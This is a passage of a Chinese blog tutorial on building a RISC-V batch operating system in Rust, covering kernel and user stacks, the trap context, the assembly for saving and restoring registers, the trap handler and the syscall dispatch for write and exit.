class="hljs-comment">/// init batch subsystem</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>() &#123;<br>    <span class="hljs-title function_ invoke__">print_app_info</span>();<br>&#125;<br><br><span class="hljs-comment">/// print apps info</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_app_info</span>() &#123;<br>    APP_MANAGER.<span class="hljs-title function_ invoke__">exclusive_access</span>().<span class="hljs-title function_ invoke__">print_app_info</span>();<br>&#125;<br><br><span class="hljs-comment">/// run next app</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">run_next_app</span>() <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">app_manager</span> = APP_MANAGER.<span class="hljs-title function_ invoke__">exclusive_access</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">current_app</span> = app_manager.<span class="hljs-title function_ invoke__">get_current_app</span>();<br>    app_manager.<span class="hljs-title function_ invoke__">load_app</span>(current_app);<br>    app_manager.<span class="hljs-title function_ invoke__">move_to_next_app</span>();<br>    <span class="hljs-title function_ invoke__">drop</span>(app_manager);<br>    <span class="hljs-comment">// before this we have to drop local variables related to resources manually</span><br>    <span class="hljs-comment">// and release the resources</span><br>    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>        <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">__restore</span>(cx_addr: <span class="hljs-type">usize</span>);<br>    &#125;<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        __restore(KERNEL_STACK.<span class="hljs-title function_ invoke__">push_context</span>(TrapContext::<span class="hljs-title function_ invoke__">app_init_context</span>(<br>            APP_BASE_ADDRESS,<br>            USER_STACK.<span class="hljs-title function_ invoke__">get_sp</span>(),<br>            )) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> _ <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);<br>    &#125;<br>    <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Unreachable in batch::run_current_app!!!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="实现特权级的切换"><a href="#实现特权级的切换" class="headerlink" title="实现特权级的切换"></a>实现特权级的切换</h2><p>最后，我们来实现<code>特权级的切换</code>!</p><p>我们的应用程序在用户态特权级运行时，无法直接通过<code>函数调用</code>访问处于内核态特权级的批处理操作系统内核中的函数</p><p>但应用程序又需要得到操作系统提供的服务，所以应用程序与操作系统需要通过某种<code>合作机制</code>完成特权级之间的切换，使得用户态应用程序可以得到内核态操作系统函数的服务</p><p>我们至少要做到:</p><ul><li><p>当启动应用程序的时候，需要初始化应用程序的用户态上下文，并能切换到用户态执行应用程序</p></li><li><p>当应用程序发起系统调用(<code>Trap</code>)之后，需要到批处理操作系统中进行处理</p></li><li><p>当应用程序执行出错的时候，需要到批处理操作系统中杀死该应用并加载运行下一个应用</p></li><li><p>当应用程序执行结束的时候，需要到批处理操作系统中加载运行下一个应用(实际上就是通过系统调用<code>sys_exit</code>来实现的)</p></li></ul><p>ps: 在<em>introduction</em>中，我们已经介绍了<strong>寄存器</strong>相关知识</p><p>在Trap触发的一瞬间，CPU就会切换到 S 特权级并跳转到<code>stvec</code>所指示的位置</p><p>但是在正式进入 S 特权级的 Trap 处理之前，我们必须<strong>保存原控制流的寄存器状态</strong></p><p>这一般通过<strong>内核栈</strong>来保存</p><p>至于为什么不直接用<code>用户栈</code>呢?</p><p>主要是为了<strong>安全性</strong>:如果两个控制流(即应用程序的控制流和内核的控制流)使用同一个栈，在返回之后应用程序就能读到 Trap 控制流的历史信息，比如内核一些函数的地址，这样会带来安全隐患~</p><p>我们声明两个类型<code>KernelStack</code>和<code>UserStack</code>分别表示<code>内核栈</code>和<code>用户栈</code>:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/batch.rs</span><br><br><span class="hljs-keyword">const</span> USER_STACK_SIZE: <span class="hljs-type">usize</span> = <span class="hljs-number">4096</span> * <span class="hljs-number">2</span>;<br><span class="hljs-keyword">const</span> KERNEL_STACK_SIZE: <span class="hljs-type">usize</span> = <span class="hljs-number">4096</span> * <span class="hljs-number">2</span>;<br><br><span class="hljs-meta">#[repr(align(4096))]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">KernelStack</span> &#123;<br>    data: [<span class="hljs-type">u8</span>; KERNEL_STACK_SIZE],<br>&#125;<br><br><span class="hljs-meta">#[repr(align(4096))]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserStack</span> &#123;<br>    data: [<span class="hljs-type">u8</span>; USER_STACK_SIZE],<br>&#125;<br><br><span class="hljs-keyword">static</span> KERNEL_STACK: KernelStack = KernelStack &#123; data: [<span class="hljs-number">0</span>; KERNEL_STACK_SIZE] &#125;;<br><span class="hljs-keyword">static</span> USER_STACK: UserStack = UserStack &#123; data: [<span class="hljs-number">0</span>; USER_STACK_SIZE] &#125;;<br></code></pre></td></tr></table></figure><p>二者的大小均为$8KiB$，且以全局变量的形式实例化在批处理操作系统的<code>.bss</code>段中</p><p>同时为两个类型实现<code>get_sp</code>方法来获取栈顶地址:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">KernelStack</span> &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_sp</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> &#123;<br>        <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">as_ptr</span>() <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span> + KERNEL_STACK_SIZE<br>    &#125;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">push_context</span>(&amp;<span class="hljs-keyword">self</span>, cx: TrapContext) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-keyword">mut</span> TrapContext &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">cx_ptr</span> = (<span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">get_sp</span>() - core::mem::size_of::&lt;TrapContext&gt;()) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> TrapContext;<br>        <span class="hljs-keyword">unsafe</span> &#123;<br>            *cx_ptr = cx;<br>        &#125;<br>        <span class="hljs-keyword">unsafe</span> &#123; cx_ptr.<span class="hljs-title function_ invoke__">as_mut</span>().<span class="hljs-title function_ invoke__">unwrap</span>() &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">UserStack</span> &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_sp</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> &#123;<br>        <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">as_ptr</span>() <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span> + USER_STACK_SIZE<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>于是<strong>换栈</strong>只需将<code>sp</code>寄存器的值修改为<code>get_sp</code>的返回值即可!</p><p>接下来我们定义<code>Trap</code>上下文:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/trap/context.rs</span><br><br><span class="hljs-meta">#[repr(C)]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TrapContext</span> &#123;<br>    <span class="hljs-keyword">pub</span> x: [<span class="hljs-type">usize</span>; <span class="hljs-number">32</span>],<br>    <span class="hljs-keyword">pub</span> sstatus: Sstatus,<br>    <span class="hljs-keyword">pub</span> sepc: <span class="hljs-type">usize</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>重点保存通用寄存器<code>x0~x31</code>，<code>sstatus</code>与<code>sepc</code></p><p>现在来具体实现 Trap 上下文保存和恢复的汇编代码</p><p>首先，我们需要修改<code>stvec</code>寄存器，使其指向正确的 Trap 处理入口点</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/trap/mod.rs</span><br><br>global_asm!(<span class="hljs-built_in">include_str!</span>(<span class="hljs-string">&quot;trap.S&quot;</span>));<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>() &#123;<br>    <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123; <span class="hljs-keyword">fn</span> <span class="hljs-title function_">__alltraps</span>(); &#125;<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        stvec::<span class="hljs-title function_ invoke__">write</span>(__alltraps <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, TrapMode::Direct);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是<code>__alltraps</code>的实现，挺好理解的~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs asm"># os/src/trap/trap.S<br><br>.macro SAVE_GP n<br>    sd x\n, \n*8(sp)<br>.endm<br><br>.align 2<br>__alltraps:<br>    csrrw sp, sscratch, sp<br>    # now sp-&gt;kernel stack, sscratch-&gt;user stack<br>    # allocate a TrapContext on kernel stack<br>    addi sp, sp, -34*8<br>    # save general-purpose registers<br>    sd x1, 1*8(sp)<br>    # skip sp(x2), we will save it later<br>    sd x3, 3*8(sp)<br>    # skip tp(x4), application does not use it<br>    # save x5~x31<br>    .set n, 5<br>    .rept 27<br>        SAVE_GP %n<br>        .set n, n+1<br>    .endr<br>    # we can use t0/t1/t2 freely, because they were saved on kernel stack<br>    csrr t0, sstatus<br>    csrr t1, sepc<br>    sd t0, 32*8(sp)<br>    sd t1, 33*8(sp)<br>    # read user stack from sscratch and save it on the kernel stack<br>    csrr t2, sscratch<br>    sd t2, 2*8(sp)<br>    # set input argument of trap_handler(cx: &amp;mut TrapContext)<br>    mv a0, sp<br>    call trap_handler<br></code></pre></td></tr></table></figure><div class="note note-success">            <p>tips: <em>CSR</em>相关<strong>原子指令</strong>:</p> <p>RISC-V中读写CSR的指令是一类能不会被打断地完成多个读写操作的指令</p> <p>这种不会被打断地完成多个操作的指令被称为<strong>原子指令</strong>(Atomic Instruction)，这里<code>原子</code>的含义是“不可分割的最小个体”，也就是说指令的多个操作要么都不完成，要么全部完成，而不会处于某种中间状态</p> <p>另外，RISC-V架构中常规的数据处理和访存类指令只能操作通用寄存器而不能操作CSR</p> <p>因此，当想要对CSR进行操作时，需要先使用读取CSR的指令将CSR读到一个通用寄存器中，而后操作该通用寄存器，最后再使用写入CSR的指令将该通用寄存器的值写入到CSR中!</p>           </div><p>当<code>trap_handler</code>返回之后则会从调用trap_handler的下一条指令开始执行，也就是下面的<code>__restore</code>!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs asm"># os/src/trap/trap.S<br><br>.macro LOAD_GP n<br>    ld x\n, \n*8(sp)<br>.endm<br><br>__restore:<br>    # case1: start running app by __restore<br>    # case2: back to U after handling trap<br>    mv sp, a0<br>    # now sp-&gt;kernel stack(after allocated), sscratch-&gt;user stack<br>    # restore sstatus/sepc<br>    ld t0, 32*8(sp)<br>    ld t1, 33*8(sp)<br>    ld t2, 2*8(sp)<br>    csrw sstatus, t0<br>    csrw sepc, t1<br>    csrw sscratch, t2<br>    # restore general-purpuse registers except sp/tp<br>    ld x1, 1*8(sp)<br>    ld x3, 3*8(sp)<br>    .set n, 5<br>    .rept 27<br>        LOAD_GP %n<br>        .set n, n+1<br>    .endr<br>    # release TrapContext on kernel stack<br>    addi sp, sp, 34*8<br>    # now sp-&gt;kernel stack, sscratch-&gt;user stack<br>    csrrw sp, sscratch, sp<br>    sret<br></code></pre></td></tr></table></figure><p>依旧很好理解</p><p>接下来我们使用Rust实现<code>trap_handler</code>:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/trap/mod.rs</span><br><br><span class="hljs-meta">#[no_mangle]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">trap_handler</span>(cx: &amp;<span class="hljs-keyword">mut</span> TrapContext) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> TrapContext &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">scause</span> = scause::<span class="hljs-title function_ invoke__">read</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">stval</span> = stval::<span class="hljs-title function_ invoke__">read</span>();<br>    <span class="hljs-keyword">match</span> scause.<span class="hljs-title function_ invoke__">cause</span>() &#123;<br>        Trap::<span class="hljs-title function_ invoke__">Exception</span>(Exception::UserEnvCall) =&gt; &#123;<br>            cx.sepc += <span class="hljs-number">4</span>;<br>            cx.x[<span class="hljs-number">10</span>] = <span class="hljs-title function_ invoke__">syscall</span>(cx.x[<span class="hljs-number">17</span>], [cx.x[<span class="hljs-number">10</span>], cx.x[<span class="hljs-number">11</span>], cx.x[<span class="hljs-number">12</span>]]) <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>;<br>        &#125;<br>        Trap::<span class="hljs-title function_ invoke__">Exception</span>(Exception::StoreFault) |<br>        Trap::<span class="hljs-title function_ invoke__">Exception</span>(Exception::StorePageFault) =&gt; &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[kernel] PageFault in application, kernel killed it.&quot;</span>);<br>            <span class="hljs-title function_ invoke__">run_next_app</span>();<br>        &#125;<br>        Trap::<span class="hljs-title function_ invoke__">Exception</span>(Exception::IllegalInstruction) =&gt; &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[kernel] IllegalInstruction in application, kernel killed it.&quot;</span>);<br>            <span class="hljs-title function_ invoke__">run_next_app</span>();<br>        &#125;<br>        _ =&gt; &#123;<br>            <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Unsupported trap &#123;:?&#125;, stval = &#123;:#x&#125;!&quot;</span>, scause.<span class="hljs-title function_ invoke__">cause</span>(), stval);<br>        &#125;<br>    &#125;<br>    cx<br>&#125;<br></code></pre></td></tr></table></figure><p>需要引入依赖</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># os/Cargo.toml</span><br><br><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">riscv</span> = &#123; git = <span class="hljs-string">&quot;https://github.com/rcore-os/riscv&quot;</span>, features = [<span class="hljs-string">&quot;inline-asm&quot;</span>] &#125;<br></code></pre></td></tr></table></figure><p>syscall函数并不会实际处理系统调用，而只是根据<code>syscall ID</code>分发到具体的处理函数:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/syscall/mod.rs</span><br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">syscall</span>(syscall_id: <span class="hljs-type">usize</span>, args: [<span class="hljs-type">usize</span>; <span class="hljs-number">3</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">isize</span> &#123;<br>    <span class="hljs-keyword">match</span> syscall_id &#123;<br>        SYSCALL_WRITE =&gt; <span class="hljs-title function_ invoke__">sys_write</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>, args[<span class="hljs-number">2</span>]),<br>        SYSCALL_EXIT =&gt; <span class="hljs-title function_ invoke__">sys_exit</span>(args[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span>),<br>        _ =&gt; <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Unsupported syscall_id: &#123;&#125;&quot;</span>, syscall_id),<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>并将传进来的参数<code>args</code>转化成能够被具体的系统调用处理函数接受的类型</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/syscall/fs.rs</span><br><br><span class="hljs-keyword">const</span> FD_STDOUT: <span class="hljs-type">usize</span> = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sys_write</span>(fd: <span class="hljs-type">usize</span>, buf: *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>, len: <span class="hljs-type">usize</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">isize</span> &#123;<br>    <span class="hljs-keyword">match</span> fd &#123;<br>        FD_STDOUT =&gt; &#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">slice</span> = <span class="hljs-keyword">unsafe</span> &#123; core::slice::<span class="hljs-title function_ invoke__">from_raw_parts</span>(buf, len) &#125;;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">str</span> = core::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(slice).<span class="hljs-title function_ invoke__">unwrap</span>();<br>            <span class="hljs-built_in">print!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, <span class="hljs-type">str</span>);<br>            len <span class="hljs-keyword">as</span> <span class="hljs-type">isize</span><br>        &#125;,<br>        _ =&gt; &#123;<br>            <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Unsupported fd in sys_write!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// os/src/syscall/process.rs</span><br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sys_exit</span>(xstate: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[kernel] Application exited with code &#123;&#125;&quot;</span>, xstate);<br>    <span class="hljs-title function_ invoke__">run_next_app</span>()<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>最后，我们将先前构建的操作系统与应用程序全都<code>串联</code>起来!</p><p>流程大致是:</p><p>启动QEMU(通电自检) -&gt; 固件(firmware UEFI&#x2F;BIOS) -&gt; bootloader -&gt; os -&gt; user apps</p><p>下面是为启动应用程序而特殊构造的 Trap 上下文:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/trap/context.rs</span><br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">TrapContext</span> &#123;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">set_sp</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, sp: <span class="hljs-type">usize</span>) &#123; <span class="hljs-keyword">self</span>.x[<span class="hljs-number">2</span>] = sp; &#125;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">app_init_context</span>(entry: <span class="hljs-type">usize</span>, sp: <span class="hljs-type">usize</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">sstatus</span> = sstatus::<span class="hljs-title function_ invoke__">read</span>();<br>        sstatus.<span class="hljs-title function_ invoke__">set_spp</span>(SPP::User);<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cx</span> = <span class="hljs-keyword">Self</span> &#123;<br>            x: [<span class="hljs-number">0</span>; <span class="hljs-number">32</span>],<br>            sstatus,<br>            sepc: entry,<br>        &#125;;<br>        cx.<span class="hljs-title function_ invoke__">set_sp</span>(sp);<br>        cx<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在内核栈上压入上述Trap上下文，其<code>sepc</code>是应用程序入口地址<code>0x80400000</code>，其<code>sp</code>寄存器指向用户栈，其<code>sstatus</code>的<code>SPP</code>字段被设置为User</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/batch.rs</span><br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">run_next_app</span>() <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">app_manager</span> = APP_MANAGER.<span class="hljs-title function_ invoke__">exclusive_access</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">current_app</span> = app_manager.<span class="hljs-title function_ invoke__">get_current_app</span>();<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        app_manager.<span class="hljs-title function_ invoke__">load_app</span>(current_app);<br>    &#125;<br>    app_manager.<span class="hljs-title function_ invoke__">move_to_next_app</span>();<br>    <span class="hljs-title function_ invoke__">drop</span>(app_manager);<br>    <span class="hljs-comment">// before this we have to drop local variables related to resources manually</span><br>    <span class="hljs-comment">// and release the resources</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123; <span class="hljs-keyword">fn</span> <span class="hljs-title function_">__restore</span>(cx_addr: <span class="hljs-type">usize</span>); &#125;<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        __restore(KERNEL_STACK.<span class="hljs-title function_ invoke__">push_context</span>(<br>            TrapContext::<span class="hljs-title function_ invoke__">app_init_context</span>(APP_BASE_ADDRESS, USER_STACK.<span class="hljs-title function_ invoke__">get_sp</span>())<br>        ) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> _ <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);<br>    &#125;<br>    <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Unreachable in batch::run_current_app!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>push_context</code>的返回值是内核栈压入Trap上下文之后的栈顶，它会被作为<code>__restore</code>的参数传入</p><p>这时我们就可以理解为何<code>__restore</code>函数的起始部分会有<code>mov sp, a0</code>了~</p><p>这使得在<code>__restore</code>函数中<code>sp</code>仍然可以指向内核栈的栈顶，这之后，就和执行一次普通的<code>__restore</code>函数调用一样了…</p><p><code>bootloader</code>完成初始化后将控制权转交给我们的操作系统</p><p>下面是<code>rust_main</code>:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 